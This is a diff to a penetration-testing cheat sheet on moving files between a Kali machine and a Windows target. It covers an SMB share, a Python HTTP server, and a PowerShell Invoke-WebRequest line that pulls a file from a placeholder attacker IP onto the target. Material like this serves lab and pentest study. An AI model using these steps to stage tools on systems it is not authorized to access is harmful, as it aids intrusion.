@@ -1,8 +1,6 @@
 # File transfer
 
-## Windows
-
-### SMB - from Windows to Kali or vice-versa
+## SMB - from Windows to Kali or vice-versa
 
 On Kali start a SMB share server on the folder you want to be shared
 ```
@@ -18,9 +16,21 @@ copy \\<Kali IP>\share\<file> .
 dir
 ```
 
+## HTTP - from Kali to target
+
+```
+cd <path>
+sudo python -m SimpleHTTPServer 80
+```
+
+### download from Windows
+
+Powershell
+```
+Invoke-WebRequest -Uri 'http://<Kali IP>/<filename>' -OutFile <filename> 
+```
 
 
-## Linux
 
 
 
